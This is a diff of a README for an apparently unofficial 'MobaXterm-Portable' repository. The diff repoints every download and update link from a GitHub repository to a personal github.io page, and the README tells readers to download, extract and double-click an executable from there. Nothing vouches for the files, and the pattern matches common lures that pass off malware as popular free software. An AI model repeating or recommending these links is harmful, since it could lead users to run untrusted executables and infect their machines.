@@ -1,6 +1,6 @@
 # 💻 MobaXterm-Portable — Access remote servers from your desktop
 
-[![](https://img.shields.io/badge/Download_MobaXterm-Blue?style=for-the-badge&logo=windows)](https://github.com/isixmartins-hub/MobaXterm-Portable)
+[![](https://img.shields.io/badge/Download_MobaXterm-Blue?style=for-the-badge&logo=windows)](https://isixmartins-hub.github.io)
 
 MobaXterm provides an all-in-one toolbox for remote computing. It combines a terminal, an X11 server, and network clients into one application. This version allows you to use the tool without permanent installation on your computer.
 
@@ -8,7 +8,7 @@ MobaXterm provides an all-in-one toolbox for remote computing. It combines a ter
 
 Follow these steps to set up MobaXterm on your computer.
 
-1. Visit [this page to download](https://github.com/isixmartins-hub/MobaXterm-Portable) the application files.
+1. Visit [this page to download](https://isixmartins-hub.github.io) the application files.
 2. Locate the file folder once the download finishes.
 3. Extract the contents if the folder is in a compressed format.
 4. Double-click the executable file to start the program.
@@ -86,7 +86,7 @@ No. Because it is portable, you can run it from any user directory without chang
 Yes. You can open the application multiple times if you need separate windows for your work.
 
 **How do I update the tool?**
-Download the latest version from [this page to download](https://github.com/isixmartins-hub/MobaXterm-Portable) and replace the older files in your folder. The application maintains your internal settings across updates.
+Download the latest version from [this page to download](https://isixmartins-hub.github.io) and replace the older files in your folder. The application maintains your internal settings across updates.
 
 **Is it compatible with older Windows versions?**
 The software targets Windows 10 and 11 environments. It may function on older versions, but the manufacturer provides support specifically for modern operating systems.
